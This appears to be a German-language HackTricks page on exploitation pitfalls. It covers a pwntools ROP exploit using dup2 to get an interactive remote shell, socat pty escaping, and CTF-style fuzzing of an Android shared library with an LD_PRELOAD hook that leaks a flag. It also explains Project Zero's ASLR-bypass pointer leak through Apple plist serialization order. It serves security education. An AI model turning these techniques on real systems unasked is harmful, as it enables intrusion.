# Common Exploiting Problems

{{#include ../banners/hacktricks-training.md}}

## FDs in Remote Exploitation

Wenn man beispielsweise einen Exploit an einen entfernten Server sendet, der **`system('/bin/sh')`** aufruft, wird dieser natürlich im Serverprozess ausgeführt, und `/bin/sh` erwartet Eingaben von stdin (FD: `0`) und gibt die Ausgabe auf stdout und stderr aus (FDs `1` und `2`). Daher kann der Angreifer nicht mit der Shell interagieren.

Eine Möglichkeit, das zu beheben, ist anzunehmen, dass beim Starten des Servers der **FD mit der Nummer `3`** (zum Lauschen) erstellt wurde und dass deine Verbindung anschließend im **FD mit der Nummer `4`** liegt. Daher ist es möglich, den Syscall **`dup2`** zu verwenden, um stdin (FD 0) und stdout (FD 1) auf das FD 4 (das der Verbindung des Angreifers) zu duplizieren, sodass eine Kommunikation mit der Shell nach deren Ausführung möglich wird.

[**Exploit example from here**](https://ir0nstone.gitbook.io/notes/types/stack/exploiting-over-sockets/exploit)
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = remote('localhost', 9001)

rop = ROP(elf)
rop.raw('A' * 40)
rop.dup2(4, 0)
rop.dup2(4, 1)
rop.win()

p.sendline(rop.chain())
p.recvuntil('Thanks!\x00')
p.interactive()
```
## Socat & pty

Beachte, dass socat bereits **`stdin`** und **`stdout`** auf die Socket überträgt. Allerdings fügt der `pty`-Modus **DELETE-Zeichen ein**. Wenn du also ein `\x7f` (`DELETE` —) sendest, wird es das vorherige Zeichen deines Exploits **löschen**.

Um das zu umgehen, muss jedem gesendeten `\x7f` das **Escape-Zeichen `\x16`** vorangestellt werden.

**Hier kannst du** [**find an example of this behaviour**](https://ir0nstone.gitbook.io/hackthebox/challenges/pwn/dream-diary-chapter-1/unlink-exploit)**.**

## Android AArch64 shared-library fuzzing & LD_PRELOAD hooking

Wenn eine Android-App nur eine gestrippte AArch64 `.so` ausliefert, kannst du trotzdem die exportierte Logik direkt auf dem Gerät fuzzen, ohne die APK neu zu bauen. Ein praktischer Workflow:

1. **Aufrufbare Entry-Points lokalisieren.** `objdump -T libvalidate.so | grep -E "validate"` listet schnell die exportierten Funktionen auf. Decompiler (Ghidra, IDA, BN) zeigen die echte Signatur, z. B. `int validate(const uint8_t *buf, uint64_t len)`.
2. **Schreibe ein Standalone-Harness.** Lade eine Datei, halte den Buffer am Leben und rufe das exportierte Symbol genau so auf, wie es die App tun würde. Cross-kompiliere mit dem NDK (z. B. `aarch64-linux-android21-clang harness.c -L. -lvalidate -fPIE -pie`).

<details>
<summary>Minimaler dateibasierter Harness</summary>
```c
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <unistd.h>

extern int validate(const uint8_t *buf, uint64_t len);

int main(int argc, char **argv) {
if (argc < 2) return 1;
int fd = open(argv[1], O_RDONLY);
if (fd < 0) return 1;
struct stat st = {0};
if (fstat(fd, &st) < 0) return 1;
uint8_t *buffer = malloc(st.st_size + 1);
read(fd, buffer, st.st_size);
close(fd);
int ret = validate(buffer, st.st_size);
free(buffer);
return ret;
}
```
</details>

3. **Erwartete Struktur rekonstruieren.** Fehlermeldungen und Vergleiche in Ghidra zeigten, dass die Funktion strikt formatiertes JSON mit konstanten Schlüsseln (`magic`, `version`, geschachtelte `root.children.*`) und arithmetischen Prüfungen (z. B. `value * 2 == 84` ⇒ `value` muss `42` sein) parst. Syntaktisch gültiges JSON, das schrittweise jede Verzweigung erfüllt, erlaubt es, das Schema ohne Instrumentierung zu ermitteln.
4. **Anti-Debug umgehen, um secrets zu leak.** Da die `.so` `snprintf` importiert, überschreibe `snprintf` mit `LD_PRELOAD`, um sensitive format strings zu dumpen, selbst wenn Breakpoints blockiert sind:

<details>
<summary>Minimal snprintf leak hook</summary>
```c
#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdarg.h>
#include <stdio.h>
#include <string.h>

typedef int (*vsnprintf_t)(char *, size_t, const char *, va_list);

int snprintf(char *str, size_t size, const char *fmt, ...) {
static vsnprintf_t real_vsnprintf;
if (!real_vsnprintf)
real_vsnprintf = (vsnprintf_t)dlsym(RTLD_NEXT, "vsnprintf");

va_list args;
va_start(args, fmt);
va_list args_copy;
va_copy(args_copy, args);
if (fmt && strstr(fmt, "MHL{")) {
fprintf(stdout, "[LD_PRELOAD] flag: ");
vfprintf(stdout, fmt, args);
fputc('\n', stdout);
}
int ret = real_vsnprintf(str, size, fmt, args_copy);
va_end(args_copy);
va_end(args);
return ret;
}
```
</details>

`LD_PRELOAD=./hook.so ./validate_harness payload.json` exfiltriert die interne flag und bestätigt das crash oracle, ohne das binary zu patchen.
5. **Verkleinere den fuzz space.** Disassembly zeigte einen wiederverwendeten XOR key im flag-Vergleich, d. h. die ersten sieben Bytes von `flag` waren bekannt. Nur die neun unbekannten Bytes fuzz-en.
6. **Bette fuzz bytes in ein gültiges JSON-Envelope ein.** Der AFL harness liest genau neun Bytes von `stdin`, kopiert sie in den flag suffix und hard-codiert alle anderen Felder (constants, tree depths, arithmetic preimage). Jeder malformed read beendet einfach das Programm, sodass AFL seine Zyklen auf sinnvolle Testcases verwendet:

<details>
<summary>Minimaler AFL harness</summary>
```c
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

extern int validate(unsigned char *bytes, size_t len);

#define FUZZ_SIZE 9

int main(void) {
uint8_t blob[FUZZ_SIZE];
if (read(STDIN_FILENO, blob, FUZZ_SIZE) != FUZZ_SIZE) return 0;
char suffix[FUZZ_SIZE + 1];
memcpy(suffix, blob, FUZZ_SIZE);
suffix[FUZZ_SIZE] = '\0';
char json[512];
int len = snprintf(json, sizeof(json),
"{\"magic\":16909060,\"version\":1,\"padding\":0,\"flag\":\"MHL{827b07c%s}\"," \
"\"root\":{\"type\":16,\"level\":3,\"num_children\":1,\"children\":[" \
"{\"type\":32,\"level\":2,\"num_children\":1,\"subchildren\":[" \
"{\"type\":48,\"level\":1,\"num_children\":1,\"leaves\":[" \
"{\"type\":64,\"level\":0,\"reserved\":0,\"value\":42}]}}]}}",
suffix);
if (len <= 0 || (size_t)len >= sizeof(json)) return 0;
validate((unsigned char *)json, len);
return 0;
}
```
</details>

7. **Run AFL with the crash-as-success oracle.** Jede Eingabe, die alle semantischen Prüfungen besteht und die korrekte neun-Byte-Suffix errät, löst den absichtlichen Crash aus; diese Dateien landen in `output/crashes` und können über das einfache Harness abgespielt werden, um das Geheimnis wiederherzustellen.

Dieser Workflow ermöglicht es, anti-debug-geschützte JNI-Validatoren schnell zu triagieren, secrets zu leaken, wenn nötig, und anschließend nur die relevanten Bytes zu fuzzern — und das alles, ohne die ursprüngliche APK zu verändern.

## Pointer-Keyed Hash Table Pointer Leaks on Apple Serialization

### Requirements & attack surface

- Ein Dienst akzeptiert vom Angreifer kontrollierte property lists (XML oder binary) und ruft `NSKeyedUnarchiver.unarchivedObjectOfClasses` mit einer permissiven allowlist auf (z. B. `NSDictionary`, `NSArray`, `NSNumber`, `NSString`, `NSNull`).
- Die resultierenden Objekte werden wiederverwendet und später erneut mit `NSKeyedArchiver` serialisiert (oder in deterministischer Bucket-Reihenfolge iteriert) und an den Angreifer zurückgesendet.
- Ein Key-Typ in den Containern verwendet Pointer-Werte als Hashcode. Vor März 2025 fiel `CFNull`/`NSNull` auf `CFHash(object) == (uintptr_t)object` zurück, und die Deserialisierung gab immer das shared-cache-Singleton `kCFNull` zurück, was einen stabilen kernel-shared Pointer ohne Speicherkorruption oder Timing ergab.

### Controllable hashing primitives

- **Pointer-based hashing:** Die `CFRuntimeClass` von `CFNull` besitzt keinen Hash-Callback, daher verwendet `CFBasicHash` die Objektadresse als Hash. Da das Singleton bis zum Reboot an einer festen shared-cache-Adresse liegt, ist sein Hash prozessübergreifend stabil.
- **Attacker-controlled hashes:** 32-Bit-`NSNumber`-Keys werden über `_CFHashInt` gehasht, das deterministisch und vom Angreifer kontrollierbar ist. Durch Auswahl bestimmter Integer kann der Angreifer `hash(number) % num_buckets` für jede Tabellen-Größe wählen.
- **`NSDictionary` implementation:** Immutable Dictionaries betten ein `CFBasicHash` mit einer Primzahl-Anzahl von Buckets ein, gewählt aus `__CFBasicHashTableSizes` (z. B. 23, 41, 71, 127, 191, 251, 383, 631, 1087). Kollisionen werden mit linearem Sondieren (`__kCFBasicHashLinearHashingValue`) gehandhabt, und die Serialisierung durchläuft Buckets in numerischer Reihenfolge; daher kodiert die Reihenfolge der serialisierten Keys den Bucket-Index, den jeder Key letztendlich besetzte.

### Encoding bucket indices into serialization order

Durch das Erstellen einer plist, die ein Dictionary materialisiert, dessen Buckets zwischen belegten und leeren Slots abwechseln, schränkt der Angreifer ein, wo das lineare Sondieren `NSNull` platzieren kann. Für ein 7-Bucket-Beispiel führt das Befüllen der geraden Buckets mit `NSNumber`-Keys zu:
```text
bucket:          0 1 2 3 4 5 6
occupancy:       # _ # _ # _ #
```
Während der Deserialisierung fügt das Opfer den einzelnen `NSNull`-Schlüssel ein. Sein anfänglicher Bucket ist `hash(NSNull) % 7`, aber beim Probing verschiebt er sich, bis einer der offenen Indizes {1,3,5} getroffen wird. Die serialisierte Schlüsselreihenfolge zeigt, welcher Slot benutzt wurde, und macht damit deutlich, ob der Pointer-Hash modulo 7 in {6,0,1}, {2,3} oder {4,5} liegt. Da der Angreifer die ursprüngliche serialisierte Reihenfolge kontrolliert, wird der `NSNull`-Schlüssel als letzter in der Eingabe-plist ausgegeben, sodass die Reihenfolge nach der Reserialisierung ausschließlich eine Funktion der Bucket-Platzierung ist.

### Bestimmung exakter Reste mit komplementären Tabellen

Ein einzelnes dictionary leaks nur einen Bereich von Resten. Um den exakten Wert von `hash(NSNull) % p` zu bestimmen, baut man pro Primzahl-Bucketgröße `p` **zwei** dictionaries: eines mit vorab gefüllten geraden Buckets und eines mit vorab gefüllten ungeraden Buckets. Für das komplementäre Muster (`_ # _ # _ # _`) entsprechen die leeren Slots (0,2,4,6) den Restmengen {0}, {1,2}, {3,4}, {5,6}. Die Beobachtung der serialisierten Position von `NSNull` in beiden dictionaries engt den Rest auf einen einzelnen Wert ein, weil die Schnittmenge der beiden Kandidatenmengen einen eindeutigen `r_i` für dieses `p` ergibt.

Der Angreifer bündelt alle dictionaries in einem `NSArray`, sodass ein einziger deserialize → serialize‑Durchlauf Reste für jede gewählte Tabellengröße leaks.

### Rekonstruktion des 64‑Bit shared-cache‑Pointers

Für jede Primzahl `p_i ∈ {23, 41, 71, 127, 191, 251, 383, 631, 1087}` rekonstruiert der Angreifer `hash(NSNull) ≡ r_i (mod p_i)` aus der serialisierten Reihenfolge. Die Anwendung des Chinesischen Restsatzes (CRT) zusammen mit dem erweiterten euklidischen Algorithmus ergibt:
```text
Π p_i = 23·41·71·127·191·251·383·631·1087 = 0x5ce23017b3bd51495 > 2^64
```
Somit entspricht der kombinierte Rest eindeutig dem 64-Bit-Zeiger auf `kCFNull`. Das Project Zero PoC kombiniert iterativ Kongruenzen und gibt Zwischenmoduli aus, um die Konvergenz zur echten Adresse (`0x00000001eb91ab60` auf dem verwundbaren Build) zu zeigen.

### Praktischer Ablauf

1. **Generate crafted input:** Build the attacker-side XML plist (two dictionaries per prime, `NSNull` serialized last) and convert it to binary format.
```bash
clang -o attacker-input-generator attacker-input-generator.c
./attacker-input-generator > attacker-input.plist
plutil -convert binary1 attacker-input.plist
```
2. **Victim round trip:** Der Victim-Service deserialisiert mit `NSKeyedUnarchiver.unarchivedObjectOfClasses` unter Verwendung der erlaubten Klassenmenge `{NSDictionary, NSArray, NSNumber, NSString, NSNull}` und serialisiert sofort wieder mit `NSKeyedArchiver`.
3. **Residue extraction:** Die Konvertierung der zurückgegebenen plist zurück in XML offenbart die Reihenfolge der Dictionary-Schlüssel. Ein Hilfsprogramm wie `extract-pointer.c` liest die Objekttabelle, bestimmt den Index des Singleton-`NSNull`, ordnet jedes Dictionary-Paar seinem Bucket-Rest zu und löst das CRT-System, um den shared-cache-Zeiger zu rekonstruieren.
4. **Verification (optional):** Das Kompilieren eines kleinen Objective-C-Hilfsprogramms, das `CFHash(kCFNull)` ausgibt, bestätigt, dass der leaked Wert mit der tatsächlichen Adresse übereinstimmt.

Kein Memory-Safety-Bug ist erforderlich — allein die Beobachtung der Serialisierungsreihenfolge von pointer-keyed Strukturen liefert eine remote ASLR-Bypass-Primitive.

## Verwandte Seiten

{{#ref}}
common-exploiting-problems-unsafe-relocation-fixups.md
{{#endref}}

{{#ref}}
../mobile-pentesting/android-app-pentesting/reversing-native-libraries.md
{{#endref}}

{{#ref}}
../reversing/reversing-tools-basic-methods/README.md
{{#endref}}

## Referenzen

- [FD duplication exploit example](https://ir0nstone.gitbook.io/notes/types/stack/exploiting-over-sockets/exploit)
- [Socat delete-character behaviour](https://ir0nstone.gitbook.io/hackthebox/challenges/pwn/dream-diary-chapter-1/unlink-exploit)
- [FuzzMe – Reverse Engineering and Fuzzing an Android Shared Library](https://hackmd.io/@sal/fuzzme-mobilehackinglab-ctf-writeup)
- [Pointer leaks through pointer-keyed data structures (Project Zero)](https://projectzero.google/2025/09/pointer-leaks-through-pointer-keyed.html)

{{#include ../banners/hacktricks-training.md}}
